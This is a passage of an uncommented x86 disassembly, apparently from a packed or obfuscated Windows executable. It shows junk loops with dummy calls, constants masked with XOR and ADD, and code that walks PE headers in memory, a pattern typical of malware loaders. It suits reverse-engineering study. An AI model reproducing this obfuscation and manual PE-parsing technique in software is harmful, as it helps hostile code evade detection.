  4054e9:	mov    edx,DWORD PTR ds:0x42c88e
  4054ef:	inc    edx
  4054f0:	mov    DWORD PTR ds:0x42c88e,edx
  4054f6:	jmp    0x4054a7
  4054fb:	add    DWORD PTR ds:0x427d13,edi
  405501:	mov    ds:0x409464,eax
  405506:	and    DWORD PTR ds:0x4292b9,0x0
  405510:	jmp    0x405522
  405515:	mov    edx,DWORD PTR ds:0x4292b9
  40551b:	inc    edx
  40551c:	mov    DWORD PTR ds:0x4292b9,edx
  405522:	cmp    DWORD PTR ds:0x4292b9,0x19
  405529:	jae    0x4055c8
  40552f:	cmp    DWORD PTR ds:0x4292b9,0x8
  405536:	jne    0x40554a
  40553c:	push   0x4277cc
  405541:	push   DWORD PTR [ebp-0x28]
  405544:	call   DWORD PTR ds:0x427aa3
  40554a:	cmp    DWORD PTR ds:0x4292b9,0x7
  405551:	jne    0x405566
  405557:	xor    edx,edx
  405559:	xor    edx,DWORD PTR ds:0x4292b9
  40555f:	inc    edx
  405560:	mov    DWORD PTR ds:0x4292b9,edx
  405566:	jmp    0x405515
  40556b:	mov    DWORD PTR ds:0x42759c,0x10
  405575:	cmp    DWORD PTR ds:0x42759c,0x0
  40557c:	je     0x4055c8
  405582:	cmp    DWORD PTR ds:0x42759c,0x1f
  405589:	jne    0x4055b2
  40558f:	push   0x76d3
  405594:	push   DWORD PTR [ebp-0x10]
  405597:	push   DWORD PTR [ebp-0x28]
  40559a:	push   DWORD PTR [ebp-0x14]
  40559d:	push   0x4ba5
  4055a2:	push   0x42782a
  4055a7:	push   0x400000
  4055ac:	call   DWORD PTR ds:0x4278fb
  4055b2:	mov    eax,ds:0x42759c
  4055b7:	dec    eax
  4055b8:	mov    ds:0x42759c,eax
  4055bd:	jmp    0x405575
  4055c2:	xor    DWORD PTR ds:0x427d0b,edx
  4055c8:	mov    eax,DWORD PTR [ebp-0x18]
  4055cb:	mov    edx,DWORD PTR ds:0x4092b0
  4055d1:	mov    DWORD PTR ds:0x4275a8,0x6b2
  4055db:	xor    eax,esi
  4055dd:	add    eax,ebx
  4055df:	mov    DWORD PTR ds:0x4292d1,0x50ae
  4055e9:	cmp    edx,eax
  4055eb:	mov    DWORD PTR ds:0x4292d1,0x1218
  4055f5:	jne    0x405ffd
  4055fb:	and    DWORD PTR ds:0x427d17,0x0
  405605:	mov    eax,ds:0x427d17
  40560a:	inc    eax
  40560b:	mov    ds:0x427d17,eax
  405610:	cmp    DWORD PTR ds:0x427d17,0x7
  405617:	jne    0x40562d
  40561d:	push   0x4275e0
  405622:	push   0x400000
  405627:	call   DWORD PTR ds:0x427aa7
  40562d:	cmp    DWORD PTR ds:0x427d17,0x6
  405634:	jne    0x405645
  40563a:	mov    eax,ds:0x427d17
  40563f:	inc    eax
  405640:	mov    ds:0x427d17,eax
  405645:	cmp    DWORD PTR ds:0x427d17,0x15
  40564c:	jb     0x405605
  405652:	mov    eax,DWORD PTR [ebp-0x18]
  405655:	mov    DWORD PTR [ebp-0x30],eax
  405658:	and    DWORD PTR ds:0x4275ac,0x0
  405662:	jmp    0x405672
  405667:	mov    eax,ds:0x4275ac
  40566c:	inc    eax
  40566d:	mov    ds:0x4275ac,eax
  405672:	cmp    DWORD PTR ds:0x4275ac,0x12
  405679:	jae    0x40570b
  40567f:	cmp    DWORD PTR ds:0x4275ac,0x5
  405686:	jne    0x40569c
  40568c:	push   0x8a4f
  405691:	push   0x1ced
  405696:	call   DWORD PTR ds:0x427aab
  40569c:	cmp    DWORD PTR ds:0x4275ac,0x4
  4056a3:	jne    0x4056b7
  4056a9:	xor    eax,eax
  4056ab:	xor    eax,DWORD PTR ds:0x4275ac
  4056b1:	inc    eax
  4056b2:	mov    ds:0x4275ac,eax
  4056b7:	jmp    0x405667
  4056bc:	mov    DWORD PTR ds:0x4275a8,0x1a
  4056c6:	cmp    DWORD PTR ds:0x4275a8,0x0
  4056cd:	je     0x40570b
  4056d3:	cmp    DWORD PTR ds:0x4275a8,0x24
  4056da:	jne    0x4056f5
  4056e0:	push   0x8e07
  4056e5:	push   0x4292a5
  4056ea:	push   0x400000
  4056ef:	call   DWORD PTR ds:0x4279db
  4056f5:	mov    eax,ds:0x4275a8
  4056fa:	dec    eax
  4056fb:	mov    ds:0x4275a8,eax
  405700:	jmp    0x4056c6
  405705:	neg    DWORD PTR ds:0x42c89e
  40570b:	mov    eax,DWORD PTR [ebp-0x20]
  40570e:	add    edx,0x3568
  405714:	mov    DWORD PTR [ebp-0x1c],eax
  405717:	xor    eax,eax
  405719:	add    eax,DWORD PTR ds:0x4278bb
  40571f:	mov    edi,DWORD PTR ds:0x4278bf
  405725:	sub    eax,edi
  405727:	add    eax,DWORD PTR [eax+edi*1]
  40572a:	mov    eax,ds:0x4091a0
  40572f:	or     DWORD PTR ds:0x427d1f,ecx
  405735:	mov    eax,DWORD PTR [eax+0x198]
  40573b:	sub    edx,DWORD PTR ds:0x4292b5
  405741:	mov    DWORD PTR [ebp-0xc],eax
  405744:	mov    eax,DWORD PTR [ebp-0x1c]
  405747:	mov    edx,DWORD PTR [ebp-0xc]
  40574a:	or     DWORD PTR ds:0x427594,ebx
  405750:	xor    eax,esi
  405752:	sbb    edi,0x2806
  405758:	add    eax,ebx
  40575a:	xor    edi,0x222f
  405760:	mov    DWORD PTR [edx],eax
  405762:	and    DWORD PTR ds:0x42c89e,0x0
  40576c:	jmp    0x40577e
  405771:	mov    edx,DWORD PTR ds:0x42c89e
  405777:	inc    edx
  405778:	mov    DWORD PTR ds:0x42c89e,edx
  40577e:	cmp    DWORD PTR ds:0x42c89e,0x1b
  405785:	jae    0x4057c4
  40578b:	cmp    DWORD PTR ds:0x42c89e,0x4
  405792:	jne    0x4057a3
  405798:	push   0x755f
  40579d:	call   DWORD PTR ds:0x4279df
  4057a3:	cmp    DWORD PTR ds:0x42c89e,0x3
  4057aa:	jne    0x4057bf
  4057b0:	xor    edx,edx
  4057b2:	or     edx,DWORD PTR ds:0x42c89e
  4057b8:	inc    edx
  4057b9:	mov    DWORD PTR ds:0x42c89e,edx
  4057bf:	jmp    0x405771
  4057c4:	lea    eax,[ebp-0x14]
  4057c7:	mov    DWORD PTR [ebp-0x44],eax
  4057ca:	and    DWORD PTR ds:0x4275a4,0x0
  4057d4:	jmp    0x4057e6
  4057d9:	mov    edx,DWORD PTR ds:0x4275a4
  4057df:	inc    edx
  4057e0:	mov    DWORD PTR ds:0x4275a4,edx
  4057e6:	cmp    DWORD PTR ds:0x4275a4,0x1c
  4057ed:	jae    0x40582a
  4057f3:	cmp    DWORD PTR ds:0x4275a4,0x11
  4057fa:	jne    0x40580b
  405800:	push   0x864b
  405805:	call   DWORD PTR ds:0x4279e3
  40580b:	cmp    DWORD PTR ds:0x4275a4,0x10
  405812:	jne    0x405825
  405818:	mov    edx,DWORD PTR ds:0x4275a4
  40581e:	inc    edx
  40581f:	mov    DWORD PTR ds:0x4275a4,edx
  405825:	jmp    0x4057d9
  40582a:	mov    eax,DWORD PTR [ebp-0x1c]
  40582d:	mov    edx,DWORD PTR [ebp-0x44]
  405830:	xor    eax,esi
  405832:	or     DWORD PTR ds:0x4275a0,edx
  405838:	add    eax,ebx
  40583a:	adc    DWORD PTR ds:0x4275a4,0x37fa
  405844:	mov    DWORD PTR [edx],eax
  405846:	and    DWORD PTR ds:0x4292c9,edi
  40584c:	mov    DWORD PTR [ebp-0x54],ecx
  40584f:	lea    eax,[ebp-0x54]
  405852:	or     edi,edi
  405854:	mov    DWORD PTR [ebp-0x10],eax
  405857:	mov    edi,DWORD PTR ds:0x4292b1
  40585d:	or     edi,DWORD PTR ds:0x4275a8
  405863:	mov    DWORD PTR ds:0x4292b1,edi
  405869:	mov    eax,DWORD PTR [ebp-0x54]
  40586c:	mov    DWORD PTR ds:0x4292a1,0x1d
  405876:	cmp    DWORD PTR ds:0x4292a1,0x0
  40587d:	je     0x4058ca
  405883:	cmp    DWORD PTR ds:0x4292a1,0xb
  40588a:	jne    0x40589c
  405890:	push   DWORD PTR [ebp-0x24]
  405893:	push   DWORD PTR [ebp-0x14]
  405896:	call   DWORD PTR ds:0x427aaf
  40589c:	cmp    DWORD PTR ds:0x4292a1,0xc
  4058a3:	jne    0x4058b6
  4058a9:	mov    ecx,DWORD PTR ds:0x4292a1
  4058af:	dec    ecx
  4058b0:	mov    DWORD PTR ds:0x4292a1,ecx
  4058b6:	xor    ecx,ecx
  4058b8:	xor    ecx,DWORD PTR ds:0x4292a1
  4058be:	dec    ecx
  4058bf:	mov    DWORD PTR ds:0x4292a1,ecx
  4058c5:	jmp    0x405876
  4058ca:	mov    ecx,DWORD PTR [ebp-0x10]
  4058cd:	or     DWORD PTR ds:0x427d0f,0x2cf9
  4058d7:	xor    eax,esi
  4058d9:	mov    edi,DWORD PTR ds:0x427d07
  4058df:	or     DWORD PTR ds:0x4292b9,edi
  4058e5:	add    eax,0x32729e
  4058ea:	mov    DWORD PTR [ecx],eax
  4058ec:	sub    edi,edi
  4058ee:	mov    eax,ds:0x409274
  4058f3:	sbb    DWORD PTR ds:0x42c882,0x4292dd
  4058fd:	mov    DWORD PTR [ebp-0x28],0x8e12febe
  405904:	sbb    DWORD PTR ds:0x427d0f,0x4292d5
  40590e:	mov    eax,DWORD PTR [eax]
  405910:	mov    cx,WORD PTR [ebp-0x14]
  405914:	movzx  edi,WORD PTR ds:0x4292dd
  40591b:	and    DWORD PTR ds:0x4292d9,edi
  405921:	movzx  ecx,cx
  405924:	add    DWORD PTR ds:0x4275b0,0x4292b5
  40592e:	add    ecx,DWORD PTR [eax]
  405930:	or     edi,edi
  405932:	mov    DWORD PTR [ebp-0x34],0xf89c8531
  405939:	mov    DWORD PTR [ebp-0x10],ecx
  40593c:	sub    ecx,DWORD PTR ds:0x4292c1
  405942:	mov    edi,0x5a3fc9e
  405947:	mov    eax,DWORD PTR [ebp-0x1c]
  40594a:	mov    DWORD PTR ds:0x427d1b,0x10
  405954:	cmp    DWORD PTR ds:0x427d1b,0x0
  40595b:	je     0x4059b1
  405961:	cmp    DWORD PTR ds:0x427d1b,0x6
  405968:	jne    0x405983
  40596e:	push   0x1942
  405973:	push   0x427d03
  405978:	push   0x427644
  40597d:	call   DWORD PTR ds:0x427ab3
  405983:	cmp    DWORD PTR ds:0x427d1b,0x7
  40598a:	jne    0x40599f
  405990:	xor    ecx,ecx
  405992:	xor    ecx,DWORD PTR ds:0x427d1b
  405998:	dec    ecx
  405999:	mov    DWORD PTR ds:0x427d1b,ecx
  40599f:	mov    ecx,DWORD PTR ds:0x427d1b
  4059a5:	dec    ecx
  4059a6:	mov    DWORD PTR ds:0x427d1b,ecx
  4059ac:	jmp    0x405954
  4059b1:	mov    ecx,DWORD PTR [ebp-0xc]
  4059b4:	xor    eax,esi
  4059b6:	or     DWORD PTR ds:0x4292cd,0x78e6
  4059c0:	add    eax,ebx
  4059c2:	mov    DWORD PTR ds:0x4292b1,0x5c9d
  4059cc:	cmp    DWORD PTR [ecx],eax
  4059ce:	jne    0x405c08
  4059d4:	mov    eax,DWORD PTR [ebp-0x1c]
  4059d7:	xor    ecx,DWORD PTR ds:0x4292c1
  4059dd:	mov    ecx,DWORD PTR [ebp-0x10]
  4059e0:	xor    eax,esi
  4059e2:	add    eax,ebx
  4059e4:	mov    DWORD PTR ds:0x4275a4,0x5c09
  4059ee:	cmp    DWORD PTR [ecx],eax
  4059f0:	mov    DWORD PTR ds:0x4275b0,0x35e5
  4059fa:	jne    0x405ad7
  405a00:	mov    eax,DWORD PTR [ebp-0x1c]
  405a03:	mov    ecx,DWORD PTR [ebp-0x44]
  405a06:	xor    eax,esi
  405a08:	add    eax,ebx
  405a0a:	mov    DWORD PTR [ecx],eax
  405a0c:	and    DWORD PTR ds:0x42c886,0x0
  405a16:	jmp    0x405a28
  405a1b:	mov    edx,DWORD PTR ds:0x42c886
  405a21:	inc    edx
  405a22:	mov    DWORD PTR ds:0x42c886,edx
  405a28:	cmp    DWORD PTR ds:0x42c886,0x1e
  405a2f:	jae    0x405ab0
  405a35:	cmp    DWORD PTR ds:0x42c886,0x2b
  405a3c:	jne    0x405a4d
  405a42:	push   0x2523
  405a47:	call   DWORD PTR ds:0x427ab7
  405a4d:	jmp    0x405a1b
  405a52:	and    DWORD PTR ds:0x4292b5,0x0
  405a5c:	xor    edx,edx
  405a5e:	xor    edx,DWORD PTR ds:0x4292b5
  405a64:	inc    edx
  405a65:	mov    DWORD PTR ds:0x4292b5,edx
  405a6b:	cmp    DWORD PTR ds:0x4292b5,0xe
  405a72:	jne    0x405a83
  405a78:	push   0x3988
  405a7d:	call   DWORD PTR ds:0x4279e7
  405a83:	cmp    DWORD PTR ds:0x4292b5,0xd
  405a8a:	jne    0x405a9d
  405a90:	mov    edx,DWORD PTR ds:0x4292b5
  405a96:	inc    edx
  405a97:	mov    DWORD PTR ds:0x4292b5,edx
  405a9d:	cmp    DWORD PTR ds:0x4292b5,0x19
  405aa4:	jb     0x405a5c
  405aaa:	sbb    DWORD PTR ds:0x4292c9,ebx
  405ab0:	mov    eax,DWORD PTR [ebp-0x44]
  405ab3:	mov    ecx,DWORD PTR [ebp-0x34]
  405ab6:	xor    ecx,esi
  405ab8:	sub    edx,DWORD PTR ds:0x4292ad
  405abe:	mov    edx,0xffcd8d62
  405ac3:	sub    DWORD PTR ds:0x427cf7,0x427d0f
  405acd:	sub    edx,ecx
  405acf:	not    DWORD PTR ds:0x4292ad
  405ad5:	add    DWORD PTR [eax],edx
  405ad7:	and    DWORD PTR ds:0x4292ad,0x0
  405ae1:	mov    eax,ds:0x4292ad
  405ae6:	inc    eax
  405ae7:	mov    ds:0x4292ad,eax
  405aec:	cmp    DWORD PTR ds:0x4292ad,0x26
  405af3:	jne    0x405b19
  405af9:	push   DWORD PTR [ebp-0x28]
  405afc:	push   0x26cd
  405b01:	push   0x51bd
  405b06:	push   0x1327
  405b0b:	push   0x7353
  405b10:	push   DWORD PTR [ebp-0x1c]
  405b13:	call   DWORD PTR ds:0x4279eb
  405b19:	cmp    DWORD PTR ds:0x4292ad,0x16
  405b20:	jb     0x405ae1
  405b26:	mov    eax,ds:0x409274
  405b2b:	mov    eax,DWORD PTR [eax]
  405b2d:	mov    cx,WORD PTR [ebp-0x14]
  405b31:	movzx  ecx,cx
  405b34:	adc    DWORD PTR ds:0x4292a9,0x4292d1
  405b3e:	add    ecx,DWORD PTR [eax]
  405b40:	mov    DWORD PTR [ebp-0x10],ecx
  405b43:	mov    eax,ds:0x42c892
  405b48:	adc    DWORD PTR ds:0x42c89a,eax
  405b4e:	mov    eax,DWORD PTR [ebp-0x30]
  405b51:	sbb    ecx,DWORD PTR ds:0x4292b9
  405b57:	mov    ecx,DWORD PTR [ebp-0x30]
  405b5a:	or     DWORD PTR ds:0x42c88a,0x6b1f
  405b64:	xor    eax,esi
  405b66:	lea    eax,[eax+eax*1+0x32729e]
  405b6d:	adc    DWORD PTR ds:0x42759c,0x427d07
  405b77:	xor    ecx,esi
  405b79:	sub    ecx,eax
  405b7b:	mov    DWORD PTR ds:0x4275b0,0x4a7
  405b85:	mov    ax,WORD PTR [ebp-0x14]
  405b89:	mov    DWORD PTR ds:0x42c88e,0x21d5
  405b93:	movzx  eax,ax
  405b96:	mov    DWORD PTR ds:0x4292b9,0x441f
  405ba0:	cmp    eax,ecx
  405ba2:	mov    ecx,0x2c38
  405ba7:	mov    eax,DWORD PTR [ebp-0x34]
  405baa:	movzx  ecx,WORD PTR [ebp-0x14]
  405bae:	jg     0x405beb
  405bb4:	or     DWORD PTR ds:0x42c88e,0x6341
  405bbe:	xor    eax,esi
  405bc0:	sbb    DWORD PTR ds:0x427d13,0x4292bd
  405bca:	sub    ecx,eax
  405bcc:	sbb    DWORD PTR ds:0x4292a9,0x68
  405bd6:	sub    ecx,ebx
  405bd8:	mov    DWORD PTR ds:0x4292b5,0x7dde
  405be2:	mov    WORD PTR [ebp-0x14],cx
  405be6:	jmp    0x405c08
  405beb:	xor    eax,esi
  405bed:	mov    DWORD PTR ds:0x4292c1,0x28f0
  405bf7:	lea    eax,[eax+ecx*1+0x32729e]
  405bfe:	mov    DWORD PTR ds:0x4275a4,ecx
  405c04:	mov    WORD PTR [ebp-0x14],ax
  405c08:	mov    ecx,DWORD PTR [ebp-0x28]
  405c0b:	mov    eax,ds:0x427594
  405c10:	mov    eax,0x8e12febe
  405c15:	cmp    ecx,eax
  405c17:	je     0x405c41
  405c1d:	not    eax
  405c1f:	mov    eax,DWORD PTR [ebp-0xc]
  405c22:	mov    DWORD PTR ds:0x427598,0x90
  405c2c:	mov    DWORD PTR [eax],0x60341e8d
  405c32:	mov    DWORD PTR ds:0x427cfb,0xcef
  405c3c:	jmp    0x405fec
  405c41:	mov    DWORD PTR ds:0x427cfb,ecx
  405c47:	mov    ecx,DWORD PTR [ebp-0x28]
  405c4a:	mov    DWORD PTR ds:0x4275a8,0x60ce
  405c54:	cmp    ecx,0x5142ddbc
  405c5a:	mov    DWORD PTR ds:0x4292d5,0x22e7
  405c64:	jne    0x405dd1
  405c6a:	not    eax
  405c6c:	mov    eax,DWORD PTR [ebp-0xc]
  405c6f:	mov    DWORD PTR [eax],0x4214febc
  405c75:	mov    eax,DWORD PTR [ebp-0xc]
  405c78:	mov    DWORD PTR ds:0x42c89e,0x9bc
  405c82:	mov    DWORD PTR [ebp-0x4],eax
  405c85:	mov    eax,DWORD PTR [ebp-0x30]
  405c88:	mov    DWORD PTR ds:0x4292bd,ebx
  405c8e:	mov    eax,DWORD PTR [ebp-0x1c]
  405c91:	mov    eax,0x59e1
  405c96:	mov    DWORD PTR [ebp-0x4c],edi
  405c99:	mov    eax,DWORD PTR [ebp-0x4c]
  405c9c:	mov    DWORD PTR ds:0x4292d1,0x6603
  405ca6:	mov    DWORD PTR [ebp-0x8],0x4eb5
  405cad:	mov    DWORD PTR ds:0x42c89e,0x4b8d
  405cb7:	cmp    eax,edi
  405cb9:	jne    0x405fec
  405cbf:	mov    ax,WORD PTR [ebp-0x8]
  405cc3:	and    DWORD PTR ds:0x4292c9,0x0
  405ccd:	mov    ecx,DWORD PTR ds:0x4292c9
  405cd3:	inc    ecx
  405cd4:	mov    DWORD PTR ds:0x4292c9,ecx
  405cda:	cmp    DWORD PTR ds:0x4292c9,0x7
  405ce1:	jne    0x405d0a
  405ce7:	push   0x3aec
  405cec:	push   0x6e2f
  405cf1:	push   0x3209
  405cf6:	push   0x4292c9
  405cfb:	push   DWORD PTR [ebp-0x20]
  405cfe:	push   DWORD PTR [ebp-0x28]
  405d01:	push   DWORD PTR [ebp-0x14]
  405d04:	call   DWORD PTR ds:0x427abb
  405d0a:	cmp    DWORD PTR ds:0x4292c9,0x6
  405d11:	jne    0x405d24
  405d17:	mov    ecx,DWORD PTR ds:0x4292c9
  405d1d:	inc    ecx
  405d1e:	mov    DWORD PTR ds:0x4292c9,ecx
  405d24:	cmp    DWORD PTR ds:0x4292c9,0x1a
  405d2b:	jb     0x405ccd
  405d31:	mov    ecx,0x8a42
  405d36:	and    DWORD PTR ds:0x427598,0x7f75
  405d40:	xor    ax,cx
  405d43:	mov    ecx,DWORD PTR ds:0x427594
  405d49:	xor    DWORD PTR ds:0x4292c9,ecx
  405d4f:	mov    ecx,0x3b08
  405d54:	add    ax,cx
  405d57:	mov    ecx,DWORD PTR [ebp-0x4]
  405d5a:	movzx  eax,ax
  405d5d:	sub    DWORD PTR ds:0x4292dd,0x42c892
  405d67:	not    eax
  405d69:	add    DWORD PTR ds:0x42c88a,0x427d03
  405d73:	and    eax,DWORD PTR [ecx]
  405d75:	mov    DWORD PTR ds:0x42c886,0x6891
  405d7f:	mov    ecx,DWORD PTR [ebp-0x4]
  405d82:	mov    DWORD PTR ds:0x4275ac,0x5963
  405d8c:	mov    DWORD PTR [ecx],eax
  405d8e:	jmp    0x405d9a
  405d93:	xor    DWORD PTR [ebp-0x4c],0xe149ebe
  405d9a:	xor    DWORD PTR ds:0x427d1b,0x1156
  405da4:	mov    ax,WORD PTR [ebp-0x8]
  405da8:	push   DWORD PTR [ebp-0x4]
  405dab:	call   0x401000
  405db0:	test   eax,eax
  405db2:	mov    DWORD PTR ds:0x4292d9,0x68ee
  405dbc:	je     0x405d93
  405dc2:	mov    DWORD PTR ds:0x4292b1,0x2e0e
  405dcc:	jmp    0x405fec
  405dd1:	mov    ecx,DWORD PTR [ebp-0x28]
  405dd4:	cmp    ecx,0x1443fcbd
  405dda:	mov    DWORD PTR ds:0x427598,0x1afd
  405de4:	jne    0x405e02
  405dea:	mov    eax,DWORD PTR [ebp-0xc]
  405ded:	mov    DWORD PTR ds:0x4292b9,0x35a9
  405df7:	mov    DWORD PTR [eax],0x60062d8f
  405dfd:	jmp    0x405fec
  405e02:	mov    ecx,DWORD PTR [ebp-0x28]
  405e05:	cmp    ecx,eax
  405e07:	mov    DWORD PTR ds:0x42c88a,0x2673
  405e11:	jne    0x405f71
  405e17:	and    DWORD PTR ds:0x427cff,0x0
  405e21:	xor    eax,eax
  405e23:	or     eax,DWORD PTR ds:0x427cff
  405e29:	inc    eax
  405e2a:	mov    ds:0x427cff,eax
  405e2f:	cmp    DWORD PTR ds:0x427cff,0xc
  405e36:	jne    0x405e47
  405e3c:	push   0x4d1d
  405e41:	call   DWORD PTR ds:0x427abf
  405e47:	cmp    DWORD PTR ds:0x427cff,0xb
  405e4e:	jne    0x405e62
  405e54:	xor    eax,eax
  405e56:	or     eax,DWORD PTR ds:0x427cff
  405e5c:	inc    eax
  405e5d:	mov    ds:0x427cff,eax
  405e62:	cmp    DWORD PTR ds:0x427cff,0x1f
  405e69:	jb     0x405e21
  405e6f:	mov    eax,DWORD PTR [ebp-0x1c]
  405e72:	mov    ecx,DWORD PTR [ebp-0xc]
  405e75:	xor    eax,esi
  405e77:	add    eax,ebx
  405e79:	cmp    DWORD PTR [ecx],eax
  405e7b:	je     0x405efe
  405e81:	mov    ecx,DWORD PTR [ebp-0x54]
  405e84:	mov    eax,DWORD PTR [ebp-0xc]
  405e87:	mov    eax,DWORD PTR [eax]
  405e89:	mov    eax,DWORD PTR [eax+0x3c]
  405e8c:	lea    ecx,[ecx*8+0x78]
  405e93:	add    eax,ecx
  405e95:	mov    ecx,DWORD PTR [ebp-0xc]
  405e98:	mov    ecx,DWORD PTR [ecx]
  405e9a:	mov    eax,DWORD PTR [eax+ecx*1]
  405e9d:	mov    DWORD PTR [ebp-0x8],eax
  405ea0:	mov    eax,DWORD PTR [ebp-0x1c]
  405ea3:	xor    eax,esi
  405ea5:	add    eax,ebx
  405ea7:	mov    DWORD PTR [ebp-0x4],eax
  405eaa:	mov    eax,DWORD PTR [ebp-0x1c]
  405ead:	mov    ecx,DWORD PTR [ebp-0x8]
  405eb0:	xor    eax,esi
  405eb2:	add    eax,ebx
  405eb4:	cmp    ecx,eax
  405eb6:	je     0x405fec
  405ebc:	mov    eax,DWORD PTR [ebp-0xc]
  405ebf:	mov    ecx,DWORD PTR [ebp-0x8]
  405ec2:	add    ecx,DWORD PTR [eax]
  405ec4:	mov    DWORD PTR [ebp-0x4],ecx
  405ec7:	mov    eax,DWORD PTR [ebp-0x4]
  405eca:	mov    ecx,DWORD PTR [ebp-0xc]
  405ecd:	mov    eax,DWORD PTR [eax+0xc]
  405ed0:	mov    ecx,DWORD PTR [ecx]
  405ed2:	mov    al,BYTE PTR [eax+ecx*1]
  405ed5:	add    al,0x35
  405ed7:	xor    al,0x49
  405ed9:	cmp    al,0xc9
  405edb:	je     0x405ef2
  405ee1:	mov    eax,DWORD PTR [ebp-0x1c]
  405ee4:	mov    ecx,DWORD PTR [ebp-0xc]
  405ee7:	xor    eax,esi
  405ee9:	add    eax,ebx
  405eeb:	mov    DWORD PTR [ecx],eax
  405eed:	jmp    0x405fec
  405ef2:	xor    DWORD PTR [ebp-0x28],0x5fd8f
  405ef9:	jmp    0x405fec
  405efe:	mov    eax,DWORD PTR [ebp-0xc]
  405f01:	mov    ecx,DWORD PTR [ebp-0x10]
  405f04:	mov    ecx,DWORD PTR [ecx]
  405f06:	mov    DWORD PTR [eax],ecx
  405f08:	mov    eax,DWORD PTR [ebp-0xc]
  405f0b:	mov    DWORD PTR [ebp-0x4],eax
  405f0e:	mov    eax,DWORD PTR [ebp-0x30]
  405f11:	mov    eax,DWORD PTR [ebp-0x1c]
  405f14:	mov    DWORD PTR [ebp-0x5c],edi
  405f17:	mov    eax,DWORD PTR [ebp-0x5c]
  405f1a:	mov    DWORD PTR [ebp-0x8],0x4eb5
  405f21:	cmp    eax,edi
  405f23:	jne    0x405fec
  405f29:	mov    ax,WORD PTR [ebp-0x8]
  405f2d:	mov    ecx,0x8a42
  405f32:	xor    ax,cx
  405f35:	mov    ecx,0x3b08
  405f3a:	add    ax,cx
  405f3d:	mov    ecx,DWORD PTR [ebp-0x4]
  405f40:	movzx  eax,ax
  405f43:	not    eax
  405f45:	and    eax,DWORD PTR [ecx]
  405f47:	mov    ecx,DWORD PTR [ebp-0x4]
  405f4a:	mov    DWORD PTR [ecx],eax
  405f4c:	jmp    0x405f58
  405f51:	xor    DWORD PTR [ebp-0x5c],0xe149ebe
  405f58:	mov    ax,WORD PTR [ebp-0x8]
  405f5c:	push   DWORD PTR [ebp-0x4]
  405f5f:	call   0x401000
  405f64:	test   eax,eax
  405f66:	je     0x405f51
  405f6c:	jmp    0x405fec
  405f71:	mov    eax,DWORD PTR [ebp-0x28]
  405f74:	cmp    eax,0x33450cad
  405f79:	jne    0x405fec
  405f7f:	mov    eax,DWORD PTR [ebp-0xc]
  405f82:	mov    DWORD PTR [eax],0x443dc9d
  405f88:	mov    eax,DWORD PTR [ebp-0xc]
  405f8b:	mov    DWORD PTR [ebp-0x4],eax
  405f8e:	mov    eax,DWORD PTR [ebp-0x30]
  405f91:	mov    eax,DWORD PTR [ebp-0x1c]
  405f94:	mov    DWORD PTR [ebp-0x40],edi
  405f97:	mov    eax,DWORD PTR [ebp-0x40]
  405f9a:	mov    DWORD PTR [ebp-0x8],0x4eb5
  405fa1:	cmp    eax,edi
  405fa3:	jne    0x405fec
  405fa9:	mov    ax,WORD PTR [ebp-0x8]
  405fad:	mov    ecx,0x8a42
  405fb2:	xor    ax,cx
  405fb5:	mov    ecx,0x3b08
  405fba:	add    ax,cx
  405fbd:	mov    ecx,DWORD PTR [ebp-0x4]
  405fc0:	movzx  eax,ax
  405fc3:	not    eax
  405fc5:	and    eax,DWORD PTR [ecx]
  405fc7:	mov    ecx,DWORD PTR [ebp-0x4]
  405fca:	mov    DWORD PTR [ecx],eax
  405fcc:	jmp    0x405fd8
  405fd1:	xor    DWORD PTR [ebp-0x40],0xe149ebe
  405fd8:	mov    ax,WORD PTR [ebp-0x8]
  405fdc:	push   DWORD PTR [ebp-0x4]
  405fdf:	call   0x401000
  405fe4:	test   eax,eax
  405fe6:	je     0x405fd1
  405fec:	mov    eax,DWORD PTR [ebp-0x28]
  405fef:	cmp    eax,0x8e12febe
  405ff4:	je     0x405947
  405ffa:	mov    eax,DWORD PTR [ebp-0xc]
  405ffd:	mov    eax,ds:0x4091a0
  406002:	mov    eax,DWORD PTR [eax+0x18c]
  406008:	mov    eax,DWORD PTR [eax]
  40600a:	mov    DWORD PTR [ebp-0x74],eax
  40600d:	mov    eax,0xf89c8531
  406012:	mov    DWORD PTR [ebp-0x10],eax
  406015:	mov    DWORD PTR [ebp-0x10],eax
  406018:	mov    DWORD PTR [ebp-0x10],eax
  40601b:	mov    DWORD PTR [ebp-0x10],0xf89c8535
  406022:	mov    DWORD PTR [ebp-0x8],eax
  406025:	mov    DWORD PTR [ebp-0x8],0xf89c853d
  40602c:	mov    edi,DWORD PTR [ebp-0x20]
  40602f:	xor    edi,esi
  406031:	add    edi,ebx
  406033:	jmp    0x40606e
  406038:	mov    eax,DWORD PTR [ebp-0x18]
  40603b:	xor    eax,esi
  40603d:	lea    eax,[eax+edi*1+0x32729e]
  406044:	push   eax
  406045:	mov    eax,DWORD PTR [ebp-0x10]
  406048:	xor    eax,esi
  40604a:	lea    eax,[ebp+eax*1+0x3272a6]
  406051:	push   eax
  406052:	mov    eax,ds:0x4091a0
  406057:	push   DWORD PTR [eax+0x1bc]
  40605d:	call   0x402c87
  406062:	mov    eax,DWORD PTR [ebp-0x18]
  406065:	xor    eax,esi
  406067:	lea    edi,[edi+eax*1+0x32729e]
  40606e:	mov    eax,DWORD PTR [ebp-0x18]
  406071:	mov    ecx,DWORD PTR [ebp-0x18]
  406074:	xor    ecx,esi
  406076:	xor    eax,esi
  406078:	add    eax,ecx
  40607a:	mov    ecx,DWORD PTR [ebp-0x18]
  40607d:	xor    ecx,esi
  40607f:	lea    eax,[eax+ecx*1+0x9757da]
  406086:	cmp    edi,eax
  406088:	jbe    0x406038
  40608e:	mov    eax,DWORD PTR [ebp+0xc]
  406091:	mov    ds:0x409024,eax
  406096:	mov    eax,DWORD PTR [ebp+0x10]
  406099:	mov    ds:0x409278,eax
  40609e:	mov    eax,ds:0x409024
  4060a3:	mov    ecx,DWORD PTR [ebp-0x60]
  4060a6:	sub    eax,ebx
  4060a8:	xor    eax,esi
  4060aa:	mov    DWORD PTR [ecx],eax
  4060ac:	mov    eax,DWORD PTR [ebp-0x58]
  4060af:	cmp    eax,0xf89c8534
  4060b4:	je     0x406111
  4060ba:	mov    eax,DWORD PTR [ebp-0x20]
  4060bd:	mov    ecx,DWORD PTR [ebp-0x50]
  4060c0:	xor    eax,esi
  4060c2:	add    eax,ebx
  4060c4:	cmp    eax,ecx
  4060c6:	je     0x406111
  4060cc:	mov    eax,ds:0x4091a0
  4060d1:	mov    eax,DWORD PTR [eax+0x194]
  4060d7:	mov    ecx,DWORD PTR [eax]
  4060d9:	mov    eax,DWORD PTR [ecx+0x3c]
